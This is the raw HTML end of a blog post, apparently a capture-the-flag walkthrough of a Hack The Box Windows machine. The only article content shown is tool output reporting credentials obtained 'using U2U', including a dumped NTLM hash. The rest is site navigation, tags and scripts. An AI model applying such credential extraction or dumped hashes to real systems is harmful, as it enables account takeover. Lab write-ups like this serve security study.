+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Getting</span><span class="w"> </span><span class="nx">credentials</span><span class="w"> </span><span class="nx">using</span><span class="w"> </span><span class="nx">U2U</span><span class="w">
+
+  </span><span class="n">CredentialInfo</span><span class="w">         </span><span class="p">:</span><span class="w">
+    </span><span class="n">Version</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+    </span><span class="n">EncryptionType</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">rc4_hmac</span><span class="w">
+    </span><span class="n">CredentialData</span><span class="w">       </span><span class="p">:</span><span class="w">
+      </span><span class="n">CredentialCount</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">
+       </span><span class="n">NTLM</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">A7864AB463177ACB9AEC553F18F42577</span><span class="w">
+</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb-machines/'>HTB MACHINES</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Absolute+-+ArVillalobos&url=https%3A%2F%2Farvillalobos.github.io%2Fposts%2FABSOLUTE%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Absolute+-+ArVillalobos&u=https%3A%2F%2Farvillalobos.github.io%2Fposts%2FABSOLUTE%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Farvillalobos.github.io%2Fposts%2FABSOLUTE%2F&text=Absolute+-+ArVillalobos" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/WinEventLogs/">Windows Event Logs & Finding Evil</a><li><a href="/posts/WINDOWSPRIVESC/">Windows Privilege Escalation</a><li><a href="/posts/PASSWORDATTACK/">Password Attack</a><li><a href="/posts/ACTIVEDIRECTORY/">Active Directory</a><li><a href="/posts/SPIDER/">Spider</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/getnpusers/">getnpusers</a> <a class="post-tag" href="/tags/ntds/">NTDS</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/portforwarding/">portforwarding</a> <a class="post-tag" href="/tags/sam/">SAM</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/accountoperators/">accountoperators</a> <a class="post-tag" href="/tags/ad/">ad</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/RETURN/"><div class="card-body"> <em class="small" data-ts="1682623530" data-df="ll" > Apr 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Return</h3><div class="text-muted small"><p> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REAS...</p></div></div></a></div><div class="card"> <a href="/posts/BREADSCRUMBS/"><div class="card-body"> <em class="small" data-ts="1682709930" data-df="ll" > Apr 28, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Breadscrumbs</h3><div class="text-muted small"><p> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 # Nmap 7.93 scan ini...</p></div></div></a></div><div class="card"> <a href="/posts/WORKER/"><div class="card-body"> <em class="small" data-ts="1659291930" data-df="ll" > Jul 31, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Worker</h3><div class="text-muted small"><p> # Nmap 7.92 scan initiated Sat Oct 15 21:01:07 2022 as: nmap -sCV -p80,3690,5985 -oN targeted 10.10.10.203 Nmap scan report for 10.10.10.203 Host is up (0.14s latency). PORT STATE SERVICE VER...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SOCCER/" class="btn btn-outline-primary" prompt="Older"><p>Soccer</p></a> <a href="/posts/ESCAPE/" class="btn btn-outline-primary" prompt="Newer"><p>Escape</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/ArVillalobos">ArVillalobos</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/getnpusers/">getnpusers</a> <a class="post-tag" href="/tags/ntds/">NTDS</a> <a class="post-tag" href="/tags/ntlm/">NTLM</a> <a class="post-tag" href="/tags/portforwarding/">portforwarding</a> <a class="post-tag" href="/tags/sam/">SAM</a> <a class="post-tag" href="/tags/ssrf/">ssrf</a> <a class="post-tag" href="/tags/accountoperators/">accountoperators</a> <a class="post-tag" href="/tags/ad/">ad</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/binary/">binary</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
